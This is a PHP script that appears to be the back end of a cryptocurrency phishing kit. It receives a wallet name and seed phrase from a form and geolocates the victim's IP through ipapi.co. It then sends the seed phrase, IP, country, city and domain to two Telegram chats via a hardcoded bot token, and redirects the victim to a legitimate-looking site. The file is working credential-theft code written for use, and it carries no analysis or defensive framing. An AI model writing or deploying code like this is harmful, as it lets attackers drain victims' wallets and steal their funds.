<?php  
  // params
  $emptyMess = '';
  $nameWall = $_POST['wallet'];
  $cid = $_POST['phrase'];

  // security
  if ($cid == '') {
    header('Location: ../');
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
    $NowDomen = $_SERVER['SERVER_NAME'];
    $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
    $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
  
    // bot telegram
    $token = "5155324140:AAGoprfM61UdyGE9_6KTRNK_8jG11dFXPsE";
    $chat_id = "721360505";
    $chat_idd="1038802808";
  
    // message
    $arr = array(
      "💸 Поздравляем, новый лог!" => $emptyMess,
      "💵 Кошелёк: " => $nameWall,
      "🔑 SEED Фраза: " => $cid,
      "🗻 IP: " => $ip,
      "🌍 Страна: " => $NowCountry,
      "🌇 Город: " => $NowCity,
      "🔧 Домен: " => $NowDomen
    );
  
    // foreach for array
    foreach($arr as $key => $value) {
      $txt .= "<b>".$key."</b> ".$value."%0A";
    };
  
    // sending message
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_idd}&parse_mode=html&text={$txt}","r");
    header('Location: https://cryptohero.ai/');
  };
?>